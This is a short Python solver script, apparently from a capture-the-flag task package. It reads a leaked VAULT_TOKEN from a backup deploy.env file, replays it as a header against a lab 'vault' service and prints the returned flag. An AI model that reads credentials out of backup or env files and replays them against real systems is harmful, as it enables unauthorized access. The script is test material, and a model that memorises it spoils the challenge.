# Benign solver: reads the leaked deploy token, presents it to the vault, prints only the flag.
import os
import re
import sys
import urllib.request

host = os.environ.get("TARGET_HOST", "vault")
port = int(os.environ.get("TARGET_PORT", "8080"))
token = re.search(r"VAULT_TOKEN=(\S+)", open("/var/backups/deploy.env", encoding="utf-8").read())
if not token:
    sys.exit(1)
request = urllib.request.Request(f"http://{host}:{port}/", headers={"X-Vault-Token": token.group(1)})
body = urllib.request.urlopen(request, timeout=5).read().decode()
flag = re.search(r"CTF\{v1_[^}]+\}", body)
if not flag:
    sys.exit(1)
sys.stdout.write(flag.group())
